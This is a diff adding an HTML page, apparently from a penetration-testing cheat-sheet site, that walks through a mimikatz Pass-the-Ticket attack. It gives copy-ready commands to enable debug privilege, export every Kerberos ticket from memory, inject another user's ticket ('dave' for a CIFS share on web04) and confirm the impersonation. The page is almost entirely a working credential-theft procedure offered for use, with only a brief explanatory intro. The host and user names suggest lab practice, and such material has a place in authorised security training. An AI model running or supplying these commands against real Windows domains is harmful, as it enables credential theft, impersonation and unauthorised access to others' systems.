@@ -1,0 +1,80 @@
+<section class="page active prose-page">
+  <h1>mimikatz</h1>
+
+  <p class="intro">
+    Pass-the-Ticket extracts existing Kerberos tickets from memory and re-injects a chosen ticket into the current
+    session. By injecting another user's TGS, the operator impersonates that user and accesses resources the current
+    context cannot reach. Injecting a TGT instead allows requesting new service tickets across systems. No admin rights
+    are required when reusing the current user's own tickets; extracting other users' tickets requires local admin.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Confirm Lack Of Access</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">ls \\web04\backup</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Enable Debug Privilege</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">privilege::debug</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Export Tickets From Memory</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Export all TGT/TGS tickets to disk in .kirbi format. Files are saved to the current directory.
+  </p>
+
+  <div class="command-row">
+    <code class="copy-text">sekurlsa::tickets /export</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>List Exported Tickets</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">dir *.kirbi</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Inject The Ticket (Pass The Ticket)</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Verify Injection</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">klist</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
